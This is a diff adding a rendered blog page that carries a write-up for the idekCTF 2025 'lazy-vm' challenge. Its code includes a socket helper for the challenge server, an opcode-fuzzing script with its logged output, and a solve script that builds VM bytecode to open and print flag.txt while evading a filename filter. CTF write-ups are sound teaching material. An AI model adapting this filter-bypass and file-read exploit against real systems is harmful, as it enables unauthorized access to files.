@@ -1,0 +1,830 @@
+2:I[55329,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-dce450cd96773e9f.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js"],""]
+3:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-dce450cd96773e9f.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js"],"PostMeta"]
+4:"$Sreact.suspense"
+6:I[76842,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-dce450cd96773e9f.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js"],"LikeButton"]
+7:I[5613,[],""]
+9:I[31778,[],""]
+a:I[89806,["250","static/chunks/250-0ef8476c0fa8ee24.js","372","static/chunks/372-d4ef474e704f1afd.js","993","static/chunks/app/(posts)/layout-e15e5287e741ad91.js"],""]
+b:I[25694,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-8f33aca7be8ff34b.js"],"GlobalProvider"]
+c:I[30397,["250","static/chunks/250-0ef8476c0fa8ee24.js","185","static/chunks/app/layout-8f33aca7be8ff34b.js"],""]
+8:["slug","25c/wp-idekctf-justctf-2025","c"]
+0:["0wU0bGg-i0jYBeP716xqR",[[["",{"children":["(posts)",{"children":[["slug","25c/wp-idekctf-justctf-2025","c"],{"children":["__PAGE__?{\"slug\":[\"25c\",\"wp-idekctf-justctf-2025\"]}",{}]}]}]},"$undefined","$undefined",true],["",{"children":["(posts)",{"children":[["slug","25c/wp-idekctf-justctf-2025","c"],{"children":["__PAGE__",{},["$L1",[["$","$L2",null,{}],false,["$","h1",null,{"className":"x-post-title","children":"idekCTF 2025 & justCTF 2025 Writeup"}],["$","$L3",null,{"path":"/25c/wp-idekctf-justctf-2025/"}],["$","$4",null,{"fallback":["$","p",null,{"children":"Loading component..."}],"children":"$L5"}],["$","$L6",null,{"path":"/25c/wp-idekctf-justctf-2025/"}]],null]]},["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children","$8","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/82b97b807ab55020.css","precedence":"next","crossOrigin":""}]]}]]},[null,["$","div",null,{"id":"post-layout","children":[["$","div",null,{"id":"main","className":"center-wrapper","children":["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children","(posts)","children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":"$undefined","notFoundStyles":"$undefined","styles":null}]}],["$","$La",null,{}]]}],null]]},[null,["$","html",null,{"lang":"zh-CN","suppressHydrationWarning":true,"children":[["$","head",null,{"children":[["$","link",null,{"rel":"icon","href":"/favicon.ico","type":"image/x-icon"}],["$","script",null,{"async":true,"src":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"}],["$","script",null,{"async":true,"src":"https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nwindow.dataLayer = window.dataLayer || [];\nfunction gtag() {\n    dataLayer.push(arguments);\n}\ngtag('js', new Date());\ngtag('config', 'G-45BYSZ6WPY');\n"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);"}}],["$","script",null,{"dangerouslySetInnerHTML":{"__html":"\nif (!Array.prototype.findLast) {\n    Array.prototype.findLast = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return this[i];\n        }\n        return undefined;\n    };\n}\nif (!Array.prototype.findLastIndex) {\n    Array.prototype.findLastIndex = function (callback) {\n        for (let i = this.length - 1; i >= 0; i--) {\n            if (callback(this[i])) return i;\n        }\n        return -1;\n    };\n}\n"}}]]}],["$","body",null,{"children":["$","$Lb",null,{"children":[["$","$Lc",null,{}],["$","$L7",null,{"parallelRouterKey":"children","segmentPath":["children"],"loading":"$undefined","loadingStyles":"$undefined","loadingScripts":"$undefined","hasLoading":false,"error":"$undefined","errorStyles":"$undefined","errorScripts":"$undefined","template":["$","$L9",null,{}],"templateStyles":"$undefined","templateScripts":"$undefined","notFound":["$","div",null,{"id":"notfound","children":[["$","img",null,{"alt":"img","src":"/images/cry.gif"}],["$","code",null,{"id":"notfound-404","children":"404"}],["$","code",null,{"id":"notfound-text","children":"Page Not Found"}]]}],"notFoundStyles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/98e601cf5ba3633d.css","precedence":"next","crossOrigin":""}]],"styles":[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/3bc7e8f21884ab46.css","precedence":"next","crossOrigin":""}]]}]]}]}]]}],null]],[[["$","link","0",{"rel":"stylesheet","href":"/_next/static/css/268aef745a7b3740.css","precedence":"next","crossOrigin":""}]],"$Ld"]]]]
+e:I[62029,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-dce450cd96773e9f.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js"],""]
+1a:I[74365,["481","static/chunks/457b8330-b5c9cf3fcf214847.js","954","static/chunks/d3ac728e-0c798b3b8aa3bf53.js","612","static/chunks/612-fa632c1349770315.js","120","static/chunks/120-aab2c7424ca78adb.js","842","static/chunks/842-dce450cd96773e9f.js","318","static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js"],""]
+f:T1597,<span class="token keyword">import</span> functools
+<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> time
+
+
+<span class="token keyword">def</span> <span class="token function">retry</span><span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">def</span> <span class="token function">inner_decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token decorator annotation punctuation">@functools<span class="token punctuation">.</span>wraps</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span>
+        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
+            retries <span class="token operator">=</span> <span class="token number">0</span>
+            <span class="token keyword">while</span> retries <span class="token operator">&lt;</span> max_retries<span class="token punctuation">:</span>
+                <span class="token keyword">try</span><span class="token punctuation">:</span>
+                    <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>
+                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
+                    retries <span class="token operator">+=</span> <span class="token number">1</span>
+                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+            <span class="token keyword">return</span> <span class="token boolean">None</span>
+
+        <span class="token keyword">return</span> wrapper
+
+    <span class="token keyword">return</span> inner_decorator
+
+
+<span class="token decorator annotation punctuation">@retry</span><span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"latin1"</span><span class="token punctuation">)</span>
+    <span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span>
+    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"lazy-vm.chal.idek.team"</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token punctuation">)</span>
+    result <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
+    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
+10:Tfd7,from challengeio import send
+
+for i in range(10):
+    print(f"Instruction {i}:")
+    for opt in ["\x00\x00", "\x04\x00", "\x08\x00", "\x99\x00",
+                "\x04\x06\x00", "\x04\x99\x00", "\x99\x06\x00", "\x99\x99\x00"]:
+        payload = bytes([i]) + opt.encode("latin1")
+        print(payload + b"\n", send(payload))
+    print("========")
+
+"""
+Instruction 0:
+b'\x00\x00\x00\n' Thanks for playing
+b'\x00\x04\x00\n' Thanks for playing
+b'\x00\x08\x00\n' Thanks for playing
+b'\x00\x99\x00\n' Thanks for playing
+b'\x00\x04\x06\x00\n' Thanks for playing
+b'\x00\x04\x99\x00\n' Thanks for playing
+b'\x00\x99\x06\x00\n' Thanks for playing
+b'\x00\x99\x99\x00\n' Thanks for playing
+========
+Instruction 1:
+b'\x01\x00\x00\n' Thanks for playing
+b'\x01\x04\x00\n' Thanks for playing
+b'\x01\x08\x00\n' Thanks for playing
+b'\x01\x99\x00\n' Thanks for playing
+b'\x01\x04\x06\x00\n' Thanks for playing
+b'\x01\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x01\x99\x06\x00\n' Thanks for playing
+b'\x01\x99\x99\x00\n' Unknown instruction at ip=0x2
+========
+Instruction 2:
+b'\x02\x00\x00\n' Thanks for playing
+b'\x02\x04\x00\n' Thanks for playing
+b'\x02\x08\x00\n' reg index out of range
+b'\x02\x99\x00\n' reg index out of range
+b'\x02\x04\x06\x00\n' Thanks for playing
+b'\x02\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x02\x99\x06\x00\n' reg index out of range
+b'\x02\x99\x99\x00\n' reg index out of range
+========
+Instruction 3:
+b'\x03\x00\x00\n' Thanks for playing
+b'\x03\x04\x00\n' Thanks for playing
+b'\x03\x08\x00\n' reg index out of range
+b'\x03\x99\x00\n' reg index out of range
+b'\x03\x04\x06\x00\n' Thanks for playing
+b'\x03\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x03\x99\x06\x00\n' reg index out of range
+b'\x03\x99\x99\x00\n' reg index out of range
+========
+Instruction 4:
+b'\x04\x00\x00\n' Thanks for playing
+b'\x04\x04\x00\n' Thanks for playing
+b'\x04\x08\x00\n' reg index out of range
+b'\x04\x99\x00\n' reg index out of range
+b'\x04\x04\x06\x00\n' Thanks for playing
+b'\x04\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x04\x99\x06\x00\n' reg index out of range
+b'\x04\x99\x99\x00\n' reg index out of range
+========
+Instruction 5:
+b'\x05\x00\x00\n' Thanks for playing
+b'\x05\x04\x00\n' Thanks for playing
+b'\x05\x08\x00\n' reg index out of range
+b'\x05\x99\x00\n' reg index out of range
+b'\x05\x04\x06\x00\n' Thanks for playing
+b'\x05\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x05\x99\x06\x00\n' reg index out of range
+b'\x05\x99\x99\x00\n' reg index out of range
+========
+Instruction 6:
+b'\x06\x00\x00\n' Unknown instruction at ip=0x3
+b'\x06\x04\x00\n' Unknown instruction at ip=0x3
+b'\x06\x08\x00\n' reg index out of range
+b'\x06\x99\x00\n' reg index out of range
+b'\x06\x04\x06\x00\n' Thanks for playing
+b'\x06\x04\x99\x00\n' Thanks for playing
+b'\x06\x99\x06\x00\n' reg index out of range
+b'\x06\x99\x99\x00\n' reg index out of range
+========
+Instruction 7:
+b'\x07\x00\x00\n' Unknown instruction at ip=0x3
+b'\x07\x04\x00\n' Unknown instruction at ip=0x3
+b'\x07\x08\x00\n' Unknown instruction at ip=0x3
+b'\x07\x99\x00\n' Unknown instruction at ip=0x3
+b'\x07\x04\x06\x00\n' Thanks for playing
+b'\x07\x04\x99\x00\n' reg index out of range
+b'\x07\x99\x06\x00\n' Thanks for playing
+b'\x07\x99\x99\x00\n' reg index out of range
+========
+Instruction 8:
+b'\x08\x00\x00\n' Thanks for playing
+b'\x08\x04\x00\n' Unknown instruction at ip=0x3
+b'\x08\x08\x00\n' Thanks for playing
+b'\x08\x99\x00\n' Unknown instruction at ip=0x1
+b'\x08\x04\x06\x00\n' Thanks for playing
+b'\x08\x04\x99\x00\n' reg index out of range
+b'\x08\x99\x06\x00\n' Unknown instruction at ip=0x1
+b'\x08\x99\x99\x00\n' Unknown instruction at ip=0x1
+========
+Instruction 9:
+b'\t\x00\x00\n' Unknown instruction at ip=0x0
+b'\t\x04\x00\n' Unknown instruction at ip=0x0
+b'\t\x08\x00\n' Unknown instruction at ip=0x0
+b'\t\x99\x00\n' Unknown instruction at ip=0x0
+b'\t\x04\x06\x00\n' Unknown instruction at ip=0x0
+b'\t\x04\x99\x00\n' Unknown instruction at ip=0x0
+b'\t\x99\x06\x00\n' Unknown instruction at ip=0x0
+b'\t\x99\x99\x00\n' Unknown instruction at ip=0x0
+========
+"""
+11:T18e9,<span class="token keyword">from</span> challengeio <span class="token keyword">import</span> send
+
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Instruction </span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">:"</span></span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> opt <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"\x00\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x04\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x08\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x99\x00"</span><span class="token punctuation">,</span>
+                <span class="token string">"\x04\x06\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x04\x99\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x99\x06\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x99\x99\x00"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
+        payload <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> opt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"latin1"</span><span class="token punctuation">)</span>
+        <span class="token keyword">print</span><span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token punctuation">,</span> send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"========"</span><span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">"""
+Instruction 0:
+b'\x00\x00\x00\n' Thanks for playing
+b'\x00\x04\x00\n' Thanks for playing
+b'\x00\x08\x00\n' Thanks for playing
+b'\x00\x99\x00\n' Thanks for playing
+b'\x00\x04\x06\x00\n' Thanks for playing
+b'\x00\x04\x99\x00\n' Thanks for playing
+b'\x00\x99\x06\x00\n' Thanks for playing
+b'\x00\x99\x99\x00\n' Thanks for playing
+========
+Instruction 1:
+b'\x01\x00\x00\n' Thanks for playing
+b'\x01\x04\x00\n' Thanks for playing
+b'\x01\x08\x00\n' Thanks for playing
+b'\x01\x99\x00\n' Thanks for playing
+b'\x01\x04\x06\x00\n' Thanks for playing
+b'\x01\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x01\x99\x06\x00\n' Thanks for playing
+b'\x01\x99\x99\x00\n' Unknown instruction at ip=0x2
+========
+Instruction 2:
+b'\x02\x00\x00\n' Thanks for playing
+b'\x02\x04\x00\n' Thanks for playing
+b'\x02\x08\x00\n' reg index out of range
+b'\x02\x99\x00\n' reg index out of range
+b'\x02\x04\x06\x00\n' Thanks for playing
+b'\x02\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x02\x99\x06\x00\n' reg index out of range
+b'\x02\x99\x99\x00\n' reg index out of range
+========
+Instruction 3:
+b'\x03\x00\x00\n' Thanks for playing
+b'\x03\x04\x00\n' Thanks for playing
+b'\x03\x08\x00\n' reg index out of range
+b'\x03\x99\x00\n' reg index out of range
+b'\x03\x04\x06\x00\n' Thanks for playing
+b'\x03\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x03\x99\x06\x00\n' reg index out of range
+b'\x03\x99\x99\x00\n' reg index out of range
+========
+Instruction 4:
+b'\x04\x00\x00\n' Thanks for playing
+b'\x04\x04\x00\n' Thanks for playing
+b'\x04\x08\x00\n' reg index out of range
+b'\x04\x99\x00\n' reg index out of range
+b'\x04\x04\x06\x00\n' Thanks for playing
+b'\x04\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x04\x99\x06\x00\n' reg index out of range
+b'\x04\x99\x99\x00\n' reg index out of range
+========
+Instruction 5:
+b'\x05\x00\x00\n' Thanks for playing
+b'\x05\x04\x00\n' Thanks for playing
+b'\x05\x08\x00\n' reg index out of range
+b'\x05\x99\x00\n' reg index out of range
+b'\x05\x04\x06\x00\n' Thanks for playing
+b'\x05\x04\x99\x00\n' Unknown instruction at ip=0x2
+b'\x05\x99\x06\x00\n' reg index out of range
+b'\x05\x99\x99\x00\n' reg index out of range
+========
+Instruction 6:
+b'\x06\x00\x00\n' Unknown instruction at ip=0x3
+b'\x06\x04\x00\n' Unknown instruction at ip=0x3
+b'\x06\x08\x00\n' reg index out of range
+b'\x06\x99\x00\n' reg index out of range
+b'\x06\x04\x06\x00\n' Thanks for playing
+b'\x06\x04\x99\x00\n' Thanks for playing
+b'\x06\x99\x06\x00\n' reg index out of range
+b'\x06\x99\x99\x00\n' reg index out of range
+========
+Instruction 7:
+b'\x07\x00\x00\n' Unknown instruction at ip=0x3
+b'\x07\x04\x00\n' Unknown instruction at ip=0x3
+b'\x07\x08\x00\n' Unknown instruction at ip=0x3
+b'\x07\x99\x00\n' Unknown instruction at ip=0x3
+b'\x07\x04\x06\x00\n' Thanks for playing
+b'\x07\x04\x99\x00\n' reg index out of range
+b'\x07\x99\x06\x00\n' Thanks for playing
+b'\x07\x99\x99\x00\n' reg index out of range
+========
+Instruction 8:
+b'\x08\x00\x00\n' Thanks for playing
+b'\x08\x04\x00\n' Unknown instruction at ip=0x3
+b'\x08\x08\x00\n' Thanks for playing
+b'\x08\x99\x00\n' Unknown instruction at ip=0x1
+b'\x08\x04\x06\x00\n' Thanks for playing
+b'\x08\x04\x99\x00\n' reg index out of range
+b'\x08\x99\x06\x00\n' Unknown instruction at ip=0x1
+b'\x08\x99\x99\x00\n' Unknown instruction at ip=0x1
+========
+Instruction 9:
+b'\t\x00\x00\n' Unknown instruction at ip=0x0
+b'\t\x04\x00\n' Unknown instruction at ip=0x0
+b'\t\x08\x00\n' Unknown instruction at ip=0x0
+b'\t\x99\x00\n' Unknown instruction at ip=0x0
+b'\t\x04\x06\x00\n' Unknown instruction at ip=0x0
+b'\t\x04\x99\x00\n' Unknown instruction at ip=0x0
+b'\t\x99\x06\x00\n' Unknown instruction at ip=0x0
+b'\t\x99\x99\x00\n' Unknown instruction at ip=0x0
+========
+"""</span>
+12:T941,from challengeio import send
+
+
+def store(s):
+    payload = b""
+    for offset, ch in enumerate(s):
+        offset = bytes([offset])
+        # 'f','l','a','g' is forbidden
+        if ch in "flag":
+            ch_xor_0xff = bytes([ord(ch) ^ 0xFF])
+            payload += b"\x01" + ch_xor_0xff  # push(ch ^ 0xFF)
+            payload += b"\x02\x00"  # pop(R0)
+            payload += b"\x01\xff"  # push(0xFF)
+            payload += b"\x02\x07"  # pop(R7)
+            payload += b"\x05\x07"  # R0 ^= R7
+            payload += b"\x07" + offset + b"\x00"  # store(offset, R0)
+        else:
+            ch = bytes([ord(ch)])
+            payload += b"\x01" + ch  # push(ch)
+            payload += b"\x02\x07"  # pop(R7)
+            payload += b"\x07" + offset + b"\x07"  # store(offset, R7)
+    return payload
+
+
+def open():
+    payload = b"\x01\x02"  # push(2) -> R0, syscall_number = 2 (open)
+    payload += b"\x01\x00"  # push(0) -> R1, path_addr = 0x00 (flag.txt)
+    payload += b"\x01\x00"  # push(0) -> R2, flags = 0 (read-only)
+    payload += b"\x02\x02\x02\x01\x02\x00"  # pop(R2), pop(R1), pop(R0)
+    payload += b"\x08"  # syscall
+    payload += b"\x03\x00\x02\x06"  # push(R0), pop(R6) -> R6 = fd
+    payload += b"\x08"  # syscall
+    return payload
+
+
+def read(size):
+    size = bytes([size])
+    payload = b"\x01\x00"  # push(0) -> R0, syscall_number = 0 (read)
+    payload += b"\x03\x06"  # push(R6) -> R1, fd = R6 (result of open syscall)
+    payload += b"\x01\x00"  # push(0) -> R2, start_addr = 0x00
+    payload += b"\x01" + size  # push(size) -> R3
+    payload += b"\x02\x03\x02\x02\x02\x01\x02\x00"  # pop(R3), pop(R2), pop(R1), pop(R0)
+    payload += b"\x08"  # syscall
+    return payload
+
+
+def output(size):
+    size = bytes([size])
+    payload = b"\x01\x01"  # push(1) -> R0, syscall_number = 1 (write)
+    payload += b"\x01\x01"  # push(1) -> R1, fd = 1 (stdout)
+    payload += b"\x01\x00"  # push(0) -> R2, start_addr = 0x00
+    payload += b"\x01" + size  # push(size) -> R3
+    payload += b"\x02\x03\x02\x02\x02\x01\x02\x00"  # pop(R3), pop(R2), pop(R1), pop(R0)
+    payload += b"\x08"  # syscall
+    return payload
+
+
+size = 45
+payload = store("flag.txt") + open() + read(size) + output(size) + b"\x00"
+print(payload)
+print(send(payload))  # idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}Thanks for playing
+
+# idek{Th15_I$_thE_L@Z13$t_vM_i_h4vE_EvEr_5EEN}
+13:T25d0,<span class="token keyword">from</span> challengeio <span class="token keyword">import</span> send
+
+
+<span class="token keyword">def</span> <span class="token function">store</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token string">b""</span>
+    <span class="token keyword">for</span> offset<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        offset <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>offset<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token comment"># 'f','l','a','g' is forbidden</span>
+        <span class="token keyword">if</span> ch <span class="token keyword">in</span> <span class="token string">"flag"</span><span class="token punctuation">:</span>
+            ch_xor_0xff <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xFF</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            payload <span class="token operator">+=</span> <span class="token string">b"\x01"</span> <span class="token operator">+</span> ch_xor_0xff  <span class="token comment"># push(ch ^ 0xFF)</span>
+            payload <span class="token operator">+=</span> <span class="token string">b"\x02\x00"</span>  <span class="token comment"># pop(R0)</span>
+            payload <span class="token operator">+=</span> <span class="token string">b"\x01\xff"</span>  <span class="token comment"># push(0xFF)</span>
+            payload <span class="token operator">+=</span> <span class="token string">b"\x02\x07"</span>  <span class="token comment"># pop(R7)</span>
+            payload <span class="token operator">+=</span> <span class="token string">b"\x05\x07"</span>  <span class="token comment"># R0 ^= R7</span>
+            payload <span class="token operator">+=</span> <span class="token string">b"\x07"</span> <span class="token operator">+</span> offset <span class="token operator">+</span> <span class="token string">b"\x00"</span>  <span class="token comment"># store(offset, R0)</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            ch <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+            payload <span class="token operator">+=</span> <span class="token string">b"\x01"</span> <span class="token operator">+</span> ch  <span class="token comment"># push(ch)</span>
+            payload <span class="token operator">+=</span> <span class="token string">b"\x02\x07"</span>  <span class="token comment"># pop(R7)</span>
+            payload <span class="token operator">+=</span> <span class="token string">b"\x07"</span> <span class="token operator">+</span> offset <span class="token operator">+</span> <span class="token string">b"\x07"</span>  <span class="token comment"># store(offset, R7)</span>
+    <span class="token keyword">return</span> payload
+
+
+<span class="token keyword">def</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> <span class="token string">b"\x01\x02"</span>  <span class="token comment"># push(2) -> R0, syscall_number = 2 (open)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R1, path_addr = 0x00 (flag.txt)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R2, flags = 0 (read-only)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x02\x02\x02\x01\x02\x00"</span>  <span class="token comment"># pop(R2), pop(R1), pop(R0)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x08"</span>  <span class="token comment"># syscall</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x03\x00\x02\x06"</span>  <span class="token comment"># push(R0), pop(R6) -> R6 = fd</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x08"</span>  <span class="token comment"># syscall</span>
+    <span class="token keyword">return</span> payload
+
+
+<span class="token keyword">def</span> <span class="token function">read</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    size <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R0, syscall_number = 0 (read)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x03\x06"</span>  <span class="token comment"># push(R6) -> R1, fd = R6 (result of open syscall)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R2, start_addr = 0x00</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x01"</span> <span class="token operator">+</span> size  <span class="token comment"># push(size) -> R3</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x02\x03\x02\x02\x02\x01\x02\x00"</span>  <span class="token comment"># pop(R3), pop(R2), pop(R1), pop(R0)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x08"</span>  <span class="token comment"># syscall</span>
+    <span class="token keyword">return</span> payload
+
+
+<span class="token keyword">def</span> <span class="token function">output</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    size <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>size<span class="token punctuation">]</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> <span class="token string">b"\x01\x01"</span>  <span class="token comment"># push(1) -> R0, syscall_number = 1 (write)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x01"</span>  <span class="token comment"># push(1) -> R1, fd = 1 (stdout)</span>
+    payload <span class="token operator">+=</span> <span class="token string">b"\x01\x00"</span>  <span class="token comment"># push(0) -> R2, start_addr = 0x00</span>
